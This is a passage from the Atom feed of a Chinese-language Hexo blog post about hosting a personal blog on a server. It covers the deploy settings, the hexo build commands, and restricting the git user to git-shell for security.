href="#&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;-config-yml-&#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;" class="headerlink" title="&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;_config.yml, &#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;"></a>&#x4FEE;&#x6539;hexo&#x7AD9;&#x70B9;&#x914D;&#x7F6E;&#x6587;&#x4EF6;_config.yml, &#x62C9;&#x5230;&#x6700;&#x5E95;&#x90E8;</h4><pre><code>type: gitrepo: git@your-ip:/home/git/blog.git</code></pre><blockquote><p>hexo clean &amp;&amp; hexo g &amp;&amp; hexo d</p></blockquote><h4 id="&#x6700;&#x540E;"><a href="#&#x6700;&#x540E;" class="headerlink" title="&#x6700;&#x540E;"></a>&#x6700;&#x540E;</h4><p>&#x51FA;&#x4E8E;&#x5B89;&#x5168;&#x8003;&#x8651;&#xFF0C;&#x4FEE;&#x6539;&#x4E00;&#x4E0B;git&#x7528;&#x6237;&#x6743;&#x9650;,&#x7981;&#x6B62;shell&#x767B;&#x5F55;</p><blockquote><p>&#x627E;&#x5230;git&#x7528;&#x6237;&#x4FE1;&#x606F;<br>vim /etc/passwd</p></blockquote><pre><code>git:x:502:502::/home/git:/bin/bash## &#x6539;&#x4E3A;git:x:502:502::/home/git:/usr/local/git/bin/git-shell</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;使用服务器搭建Hexo个人博客详细&quot;&gt;&lt;a href=&quot;#使用服务器搭建Hexo个人博客详细&quot; class=&quot;headerlink&quot; title=&quot;使用服务器搭建Hexo个人博客详细&quot;&gt;&lt;/a&gt;使用服务器搭建Hexo个人博客&lt;code&gt;详细&lt;/code&gt;&lt;/h2&gt;&lt;p&gt;在学习的过程中，被动接受知识对你的提高是轻微的；&lt;br&gt;只有主动学习，主动思考，才能学习的透彻，至少是高于被动学习吧。&lt;br&gt;搭建个人博客，最大化的利用你所学的知识，检验是否学习的透彻。&lt;/p&gt;
    
    </summary>
    
      <category term="默认" scheme="https://marnm.github.io/categories/%E9%BB%98%E8%AE%A4/"/>
    
    
      <category term="默认" scheme="https://marnm.github.io/tags/%E9%BB%98%E8%AE%A4/"/>
    
  </entry>
  
</feed>
